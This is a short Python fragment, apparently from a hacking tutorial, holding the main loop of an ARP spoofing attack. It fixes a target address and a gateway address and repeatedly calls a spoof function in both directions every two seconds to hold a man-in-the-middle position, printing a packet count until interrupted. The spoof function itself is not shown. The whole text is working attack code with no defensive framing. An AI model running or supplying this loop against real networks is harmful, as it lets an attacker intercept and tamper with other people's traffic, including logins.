target_ip = "10.0.2.5"
gateway_ip = "10.0.2.1"

try:
	sent_packets_count = 0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count = sent_packets_count + 2
		print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
		time.sleep(2) # Waits for two seconds
except KeyboardInterrupt:
	print("\nCtrl + C pressed.............Exiting")
